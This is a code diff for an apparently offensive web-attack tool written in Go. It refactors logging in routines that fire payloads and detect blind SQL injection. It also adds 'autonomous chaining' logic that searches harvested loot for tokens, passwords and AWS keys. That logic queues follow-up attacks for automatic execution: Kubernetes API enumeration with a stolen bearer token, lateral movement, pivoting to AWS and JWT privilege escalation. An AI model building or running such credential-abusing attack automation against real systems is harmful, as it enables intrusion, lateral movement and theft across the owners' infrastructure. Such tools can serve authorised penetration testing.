@@ -7,6 +7,7 @@ import (
 	"net/http"
 	"net/url"
 	"regexp"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -81,7 +82,7 @@ PAYLOAD: [Suggested attack payload or technique]
 	// Query the global neuro engine
 	response, err := logic.GlobalNeuro.ExecuteQuery(prompt)
 	if err != nil {
-		utils.TacticalLog(fmt.Sprintf("[yellow]NEURO:[-] Analysis failed: %v", err))
+		utils.TacticalLog("[yellow]NEURO:[-] Analysis failed: " + err.Error())
 		return nil
 	}
 
@@ -285,7 +286,7 @@ func (n *NeuroEngineCore) ExecuteSmartAttack(targetURL, method string, payloads 
 	} else {
 		baselineLatency = 200 * time.Millisecond // Fallback if baseline request fails
 	}
-	utils.LogNeural(fmt.Sprintf("[blue]NEURO-AUTO:[-] Baseline established: %v", baselineLatency))
+	utils.LogNeural("[blue]NEURO-AUTO:[-] Baseline established: " + baselineLatency.String())
 
 	// 2. FIRE PAYLOADS
 	for i, payload := range payloads {
@@ -293,7 +294,7 @@ func (n *NeuroEngineCore) ExecuteSmartAttack(targetURL, method string, payloads 
 			continue
 		}
 
-		utils.LogNeural(fmt.Sprintf("[yellow]>>> FIRING VECTOR %d/%d: %s[-]", i+1, len(payloads), shortPayload(payload)))
+		utils.LogNeural("[yellow]>>> FIRING VECTOR " + strconv.Itoa(i+1) + "/" + strconv.Itoa(len(payloads)) + ": " + shortPayload(payload) + "[-]")
 
 		var req *http.Request
 		// Intelligent Injection Strategy
@@ -331,7 +332,7 @@ func (n *NeuroEngineCore) ExecuteSmartAttack(targetURL, method string, payloads 
 		}
 
 		if logic.CurrentSession.AttackerToken != "" {
-			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", logic.CurrentSession.AttackerToken))
+			req.Header.Set("Authorization", "Bearer "+logic.CurrentSession.AttackerToken)
 		}
 
 		// Identify the request as an AI-driven exploit for logging/debugging
@@ -345,7 +346,7 @@ func (n *NeuroEngineCore) ExecuteSmartAttack(targetURL, method string, payloads 
 		if err != nil {
 			// Detect Time-Based Blind SQLi if the server hangs
 			if strings.Contains(err.Error(), "Timeout") || attackDuration > 10*time.Second {
-				utils.TacticalLog(fmt.Sprintf("[red]CRITICAL: Request Timed Out (%v). Possible Heavy SQLi.[/]", attackDuration))
+				utils.TacticalLog("[red]CRITICAL: Request Timed Out (" + attackDuration.String() + "). Possible Heavy SQLi.[/]")
 				n.RecordTimeBasedSQLi(targetURL, payload, attackDuration, baselineLatency)
 			}
 		} else {
@@ -382,14 +383,14 @@ func (n *NeuroEngineCore) EvaluateResponse(resp *http.Response, payload, target 
 
 	// 3. LOGIC 2: ERROR/CRASH (Server-Side Failure)
 	if resp.StatusCode >= 500 {
-		utils.TacticalLog(fmt.Sprintf("[red]CRITICAL HIT (%d): %s (Lat: %v)[-]", resp.StatusCode, shortPayload(payload), latency))
+		utils.TacticalLog("[red]CRITICAL HIT (" + strconv.Itoa(resp.StatusCode) + "): " + shortPayload(payload) + " (Lat: " + latency.String() + ")[-]")
 
 		if db.DB != nil {
 			utils.RecordFinding(db.Finding{
 				Phase:        "PHASE 10.6: NEURO-EXPLOIT",
 				Command:      "neuro",
 				Target:       target,
-				Details:      fmt.Sprintf("Server Error (%d) triggered by payload. Possible Injection/RCE.", resp.StatusCode),
+				Details:      "Server Error (" + strconv.Itoa(resp.StatusCode) + ") triggered by payload. Possible Injection/RCE.",
 				Status:       "EXPLOITED",
 				OWASP_ID:     "API10:2023",
 				MITRE_ID:     "T1190",
@@ -401,13 +402,13 @@ func (n *NeuroEngineCore) EvaluateResponse(resp *http.Response, payload, target 
 
 	// 4. LOGIC 3: GENERIC BYPASS (Fallthrough)
 	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
-		utils.TacticalLog(fmt.Sprintf("[green]POTENTIAL BYPASS (%d): %s[-]", resp.StatusCode, shortPayload(payload)))
+		utils.TacticalLog("[green]POTENTIAL BYPASS (" + strconv.Itoa(resp.StatusCode) + "): " + shortPayload(payload) + "[-]")
 		if db.DB != nil {
 			utils.RecordFinding(db.Finding{
 				Phase:        "PHASE 10.6: NEURO-EXPLOIT",
 				Command:      "neuro",
 				Target:       target,
-				Details:      fmt.Sprintf("Logic Bypass (%d). Payload accepted.", resp.StatusCode),
+				Details:      "Logic Bypass (" + strconv.Itoa(resp.StatusCode) + "). Payload accepted.",
 				Status:       "VULNERABLE",
 				OWASP_ID:     "API1:2023",
 				MITRE_ID:     "T1595",
@@ -415,13 +416,13 @@ func (n *NeuroEngineCore) EvaluateResponse(resp *http.Response, payload, target 
 			})
 		}
 	} else {
-		utils.TacticalLog(fmt.Sprintf("[gray]Miss (%d) | Lat: %v | %s[-]", resp.StatusCode, latency, shortPayload(payload)))
+		utils.TacticalLog("[gray]Miss (" + strconv.Itoa(resp.StatusCode) + ") | Lat: " + latency.String() + " | " + shortPayload(payload) + "[-]")
 	}
 }
 
 // RecordTimeBasedSQLi records and logs a confirmed time-based SQL injection
 func (n *NeuroEngineCore) RecordTimeBasedSQLi(target, payload string, latency, baseline time.Duration) {
-	msg := fmt.Sprintf("[red]!!! TIME-BASED SQLI CONFIRMED !!! Latency: %v (Base: %v) | Vector: %s[-]", latency, baseline, payload)
+	msg := "[red]!!! TIME-BASED SQLI CONFIRMED !!! Latency: " + latency.String() + " (Base: " + baseline.String() + ") | Vector: " + payload + "[-]"
 	utils.LogNeural(msg)
 	utils.TacticalLog(msg)
 
@@ -430,7 +431,7 @@ func (n *NeuroEngineCore) RecordTimeBasedSQLi(target, payload string, latency, b
 			Phase:        "PHASE 10.6: NEURO-EXPLOIT",
 			Command:      "neuro",
 			Target:       target,
-			Details:      fmt.Sprintf("High-Confidence Time-Based Blind SQLi. Response delayed by %v (Baseline: %v).", latency, baseline),
+			Details:      "High-Confidence Time-Based Blind SQLi. Response delayed by " + latency.String() + " (Baseline: " + baseline.String() + ").",
 			Status:       "CRITICAL",
 			OWASP_ID:     "API8:2023 Injection",
 			MITRE_ID:     "T1190",
@@ -485,4 +486,141 @@ func shortPayload(p string) string {
 		return p[:47] + "..."
 	}
 	return p
+}
+
+// === SPRINT 12: Autonomous Chaining Logic ===
+// ProcessExploitResult analyzes the results of an exploit execution and automatically generates chained actions
+// If loot contains sensitive data (tokens, credentials, env vars), this function creates follow-up exploits
+func (n *NeuroEngineCore) ProcessExploitResult(exploit TacticalAction, loot string) {
+	if loot == "" {
+		return
+	}
+
+	utils.TacticalLog("[cyan]CHAIN:[-] Analyzing exploit result for chaining opportunities...")
+	utils.LogContext("[blue]Processing loot:[-] " + loot[:min(len(loot), 100)])
+
+	// Generate a unique chain ID based on the parent exploit
+	chainID := "chain_" + strconv.FormatInt(int64(exploit.ID), 10) + "_" + strconv.FormatInt(time.Now().UnixNano(), 10)
+
+	// Store the loot in GlobalDataSilo
+	lootKey := "loot_from_" + strconv.Itoa(exploit.ID)
+	logic.GlobalDataSilo.Set(lootKey, loot)
+	utils.LogContext("[green]✓ Stored loot:[-] '" + lootKey + "'")
+
+	// Analyze the loot to determine if it contains sensitive data
+	sensitiveKeys := []string{
+		"k8s_token", "kubernetes_token", "bearer", "authorization",
+		"aws_access_key", "aws_secret_key", "credential", "password",
+		"secret", "api_key", "private_key", "jwt", "session",
+	}
+
+	var detectedKeys []string
+	for _, key := range sensitiveKeys {
+		if strings.Contains(strings.ToLower(loot), key) {
+			detectedKeys = append(detectedKeys, key)
+		}
+	}
+
+	if len(detectedKeys) == 0 {
+		utils.LogContext("[yellow]No sensitive data detected in loot.[-]")
+		return
+	}
+
+	utils.LogContext("[red]⚠ Sensitive data detected:[-] " + fmt.Sprintf("%v", detectedKeys))
+
+	// Generate follow-up exploit actions based on detected data
+	for _, key := range detectedKeys {
+		var nextAction *TacticalAction
+
+		switch key {
+		case "k8s_token", "kubernetes_token":
+			nextAction = &TacticalAction{
+				Type:         "CROSS_TENANT_LEAKAGE",
+				Target:       "https://kubernetes.default.svc/api/v1/namespaces",
+				Payload:      fmt.Sprintf("Authorization: Bearer %s", loot[:50]),
+				Confidence:   "HIGH",
+				Reasoning:    "K8s token detected. Attempt to enumerate cluster resources.",
+				Status:       "PENDING",
+				PreCondition: lootKey,
+				ChainID:      chainID,
+				Loot:         fmt.Sprintf("k8s_namespaces_%d", exploit.ID),
+			}
+			utils.LogContext("[magenta]>>> Generated:[-] CROSS_TENANT_LEAKAGE action for K8s token")
+
+		case "bearer", "authorization":
+			nextAction = &TacticalAction{
+				Type:         "LATERAL_MOVEMENT",
+				Target:       exploit.Target, // Same target but with new token
+				Payload:      fmt.Sprintf("Use bearer token for privilege escalation"),
+				Confidence:   "HIGH",
+				Reasoning:    "Auth token detected. Attempt lateral movement with elevated privileges.",
+				Status:       "PENDING",
+				PreCondition: lootKey,
+				ChainID:      chainID,
+				Loot:         fmt.Sprintf("lateral_result_%d", exploit.ID),
+			}
+			utils.LogContext("[magenta]>>> Generated:[-] LATERAL_MOVEMENT action for auth token")
+
+		case "aws_access_key", "aws_secret_key":
+			nextAction = &TacticalAction{
+				Type:         "CLOUD_PIVOT",
+				Target:       "https://sts.amazonaws.com/",
+				Payload:      fmt.Sprintf("Enumerate AWS with extracted keys"),
+				Confidence:   "HIGH",
+				Reasoning:    "AWS credentials detected. Pivot to cloud infrastructure.",
+				Status:       "PENDING",
+				PreCondition: lootKey,
+				ChainID:      chainID,
+				Loot:         fmt.Sprintf("aws_enumerate_%d", exploit.ID),
+			}
+			utils.LogContext("[magenta]>>> Generated:[-] CLOUD_PIVOT action for AWS keys")
+
+		case "jwt":
+			// JWT token detected - attempt to decode and use in subsequent requests
+			nextAction = &TacticalAction{
+				Type:         "JWT_BYPASS",
+				Target:       exploit.Target,
+				Payload:      fmt.Sprintf("Decode and use JWT for privilege escalation"),
+				Confidence:   "MEDIUM",
+				Reasoning:    "JWT token found. Attempt to manipulate token claims.",
+				Status:       "PENDING",
+				PreCondition: lootKey,
+				ChainID:      chainID,
+				Loot:         fmt.Sprintf("jwt_bypass_%d", exploit.ID),
+			}
+			utils.LogContext("[magenta]>>> Generated:[-] JWT_BYPASS action for JWT token")
+
+		default:
+			nextAction = &TacticalAction{
+				Type:         "PRIVILEGE_ESCALATION",
+				Target:       exploit.Target,
+				Payload:      fmt.Sprintf("Attempt privilege escalation using discovered %s", key),
+				Confidence:   "MEDIUM",
+				Reasoning:    fmt.Sprintf("Sensitive data (%s) detected. Attempt escalation.", key),
+				Status:       "PENDING",
+				PreCondition: lootKey,
+				ChainID:      chainID,
+				Loot:         fmt.Sprintf("privesc_%d", exploit.ID),
+			}
+			utils.LogContext("[magenta]>>> Generated:[-] PRIVILEGE_ESCALATION action")
+		}
+
+		if nextAction != nil {
+			// Add to ActionBuffer for autonomous execution
+			nextAction.ID = len(ActionBuffer) + 1
+			ActionBuffer = append(ActionBuffer, *nextAction)
+			utils.TacticalLog(fmt.Sprintf("[green]✓ ACTION QUEUED:[-] %s (Chain: %s)", nextAction.Type, chainID))
+		}
+	}
+
+	// Log chain summary
+	utils.LogContext(fmt.Sprintf("[cyan]Chain Summary:[-] %d follow-up actions queued for chain '%s'", len(detectedKeys), chainID))
+}
+
+// Helper function to get minimum of two integers
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
 }
